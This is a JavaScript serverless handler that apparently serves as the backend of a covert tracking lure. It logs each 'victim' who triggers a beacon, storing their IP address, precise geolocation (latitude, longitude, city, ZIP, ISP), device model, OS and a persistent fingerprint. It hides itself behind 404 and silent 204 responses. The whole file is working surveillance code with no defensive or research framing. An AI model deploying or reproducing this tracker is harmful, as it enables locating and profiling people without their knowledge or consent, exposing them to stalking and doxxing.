const { put, get } = require('@vercel/blob');

module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(404).end();
  }
  try {
    const ip = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || '0.0.0.0').split(',')[0].trim();
    const body = (req.body && typeof req.body === 'object') ? req.body : {};
    const id = String(body.x || '').slice(0, 40).replace(/[^a-zA-Z0-9_-]/g, '');
    if (!id) {
      return res.status(204).end();
    }

    const now = Date.now();
    let geo = null;
    const geoPath = 'geo/' + ip.replace(/[^a-zA-Z0-9._-]/g, '_') + '.json';
    const cached = await readJSON(geoPath);
    if (cached && typeof cached.ts === 'number' &&
      now - cached.ts < (cached.data && cached.data.err ? 3600e3 : 604800e3)) {
      geo = cached.data;
    } else {
      geo = await lookupGeo(ip);
      if (geo) await writeJSON(geoPath, { ts: now, data: geo });
    }

    const path = 'victims/' + id + '.json';
    const prev = (await readJSON(path)) || {};

    const chModel = String(req.headers['sec-ch-ua-model'] || '').replace(/"/g, '').trim();
    const chPv = String(req.headers['sec-ch-ua-platform-version'] || '').replace(/"/g, '').trim();
    const fp = String(body.f || '').slice(0, 40).replace(/[^a-zA-Z0-9_-]/g, '');
    const known = fp ? (await readJSON('dev/' + fp + '.json')) || null : null;

    const rec = Object.assign({}, prev, body, {
      ts: new Date().toISOString(),
      ip: ip,
      geo: geo || null
    });
    if (!rec.hm && chModel) rec.hm = chModel;
    if (!rec.pv && chPv) rec.pv = chPv;
    if (known) {
      if (!rec.hm && known.hm) rec.hm = known.hm;
      if (!rec.y && known.y) rec.y = known.y;
      if (!rec.av && known.av) rec.av = known.av;
      if (!rec.os && known.os) rec.os = known.os;
      if (!rec.pv && known.pv) rec.pv = known.pv;
      if (!rec.app && known.app) rec.app = known.app;
    }
    await writeJSON(path, rec);
    if (fp && (rec.hm || rec.y || rec.os)) {
      await writeJSON('dev/' + fp + '.json', {
        f: fp, hm: rec.hm || '', y: rec.y || '', av: rec.av || '',
        os: rec.os || '', pv: rec.pv || '', app: rec.app || '', ts: rec.ts
      });
    }

    return res.status(204).end();
  } catch (e) {
    console.error('PXR_ERR', e && (e.stack || e.message || e));
    return res.status(204).end();
  }
};

async function readJSON(pathname) {
  try {
    const r = await get(pathname, { access: 'private', useCache: false });
    if (!r) return null;
    const text = await new Response(r.stream).text();
    return JSON.parse(text);
  } catch (e) {
    console.error('PXR_READ_ERR', pathname, e && (e.message || e));
    return null;
  }
}

async function writeJSON(pathname, value) {
  try {
    await put(pathname, JSON.stringify(value), {
      access: 'private',
      allowOverwrite: true,
      contentType: 'application/json',
      addRandomSuffix: false
    });
    return true;
  } catch (e) {
    console.error('PXR_WRITE_ERR', pathname, e && (e.message || e));
    return false;
  }
}

async function lookupGeo(ip) {
  if (!ip || ip === '0.0.0.0' || ip.startsWith('10.') || ip.startsWith('127.') || ip.startsWith('192.168.')) return null;
  try {
    const r = await fetch('https://ipwho.is/' + ip);
    const j = await r.json();
    if (!j || j.success === false) return { err: 1 };
    return {
      lat: j.latitude !== undefined ? j.latitude : null,
      lon: j.longitude !== undefined ? j.longitude : null,
      city: j.city || '',
      region: j.region || '',
      country: j.country || '',
      zip: j.postal || '',
      isp: j.connection && j.connection.isp || '',
      org: j.connection && j.connection.org || '',
      asn: j.connection && j.connection.asn || ''
    };
  } catch (e) {
    return { err: 1 };
  }
}
